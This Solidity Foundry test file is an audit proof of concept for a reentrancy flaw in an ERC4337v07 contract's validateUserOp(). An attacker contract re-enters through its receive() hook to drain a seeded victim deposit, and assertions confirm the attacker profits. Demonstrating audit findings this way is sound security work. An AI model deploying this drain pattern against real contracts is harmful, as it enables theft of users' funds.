// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import { ERC4337v07 } from "../src/ERC4337v07.sol";

/// @title PoC: Reentrancy in ERC4337v07.validateUserOp()
/// @notice Auto-generated by audit-agent - SWC-107
/// @dev CEI violation: state updated AFTER external call
contract ERC4337v07ReentrancyAttacker {
    ERC4337v07 public immutable target;
    uint256 public depth;
    uint256 public constant MAX_DEPTH = 3;
    uint256 public attackAmount;

    constructor(ERC4337v07 _target) {
        target = _target;
    }

    function attack(uint256 amount) external payable {
        attackAmount = amount;
        // Deposit first so target records a balance for this attacker
        target.deposit{value: amount}();
        // Now withdraw - this triggers the external call before state update
        target.validateUserOp(amount);
    }

    receive() external payable {
        if (depth < MAX_DEPTH && address(target).balance >= attackAmount) {
            depth++;
            // Re-enter: balance not yet decremented
            target.validateUserOp(attackAmount);
        }
    }
}

contract ERC4337v07ReentrancyTest is Test {
    ERC4337v07 public target;
    ERC4337v07ReentrancyAttacker public attacker;

    function setUp() public {
        target = new ERC4337v07();
        attacker = new ERC4337v07ReentrancyAttacker(target);

        // Seed the contract with victim ETH so there is something to steal
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        target.deposit{value: 10 ether}();

        // Give the test contract ETH to forward into the attack function
        vm.deal(address(this), 1 ether);
    }

    function test_reentrancy_validateUserOp() public {
        uint256 targetBefore = address(target).balance;

        // No prank needed: attack is called from the test; value forwarded via payable
        attacker.attack{value: 1 ether}(1 ether);

        uint256 targetAfter = address(target).balance;
        uint256 attackerProfit = address(attacker).balance;

        // Attacker should have drained more than just their own deposit back
        assertGt(attacker.depth(), 0, "Reentrancy: re-entry never occurred");
        assertLt(targetAfter, targetBefore - 1 ether,
            "Reentrancy: target lost more than attacker deposited");
        assertGt(attackerProfit, 0, "Reentrancy: attacker made no profit");
    }
}
